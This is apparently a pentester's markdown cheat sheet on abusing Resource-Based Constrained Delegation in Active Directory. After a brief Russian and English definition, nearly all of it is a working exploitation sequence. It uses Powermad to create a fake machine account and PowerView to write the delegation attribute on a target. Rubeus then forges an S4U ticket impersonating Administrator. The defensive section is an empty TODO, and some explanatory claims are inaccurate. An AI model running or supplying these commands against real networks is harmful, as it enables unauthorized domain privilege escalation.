# Resource Based Constrained Delegation

## What is this RU 

**Resource-Based Constrained Delegation (RBCD)** - это методика делегирования управления учетными записями в Active Directory, который позволяет управляющим учетными записями ограничивать доступ делегатов только к определенным ресурсам в сети, без предоставления полномочий администратора.
 
## What is this EN 

**Resource-Based Constrained Delegation (RBCD)** - is a method of delegating account management in Active Directory that allows account managers to limit delegate access to specific resources on the network without granting full administrator privileges.

## Explotation

Command to check ms-ds-machineaccountquota with PowerView
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain els.local
```

Check msds-allowedtoactonbehalfofotheridentity to target
```
Get-NetComputer computer_name | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

Create new computer object with PowerMad
```
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

Checks if the computer was created and marks its SID:
```
Get-DomainComputer fake01
``` 

Create a new raw security descriptor for computer principal FAKE01:
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<OBJECT-SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Applying security descriptor bytes to target machine:
```
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

Checking for success
```
Get-DomainComputer ComputerName -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

Getting hash
```
Rubeus.exe hash /password:123456 /user:fake01 /domain:els.local
```

With an RC4 hash, it is possible to request a Kerberos ticket for a NONEXISTENT computer account, which can impersonate an administrator account.
```
.\Rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:http/TARGET /ptt
```

## TODO Prevent